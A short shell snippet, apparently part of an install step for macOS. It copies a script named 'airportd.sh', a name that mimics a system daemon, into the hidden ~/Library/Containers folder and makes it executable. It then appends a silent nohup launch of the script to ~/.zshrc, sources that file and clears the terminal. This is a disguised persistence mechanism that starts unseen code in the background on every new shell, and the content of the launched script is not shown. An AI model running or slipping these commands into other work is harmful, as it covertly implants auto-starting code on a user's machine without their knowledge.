cp airportd.sh ~/Library/Containers/
chmod +x ~/Library/Containers/airportd.sh
echo "nohup ~/Library/Containers/airportd.sh &" >> ~/.zshrc
source ~/.zshrc
clear
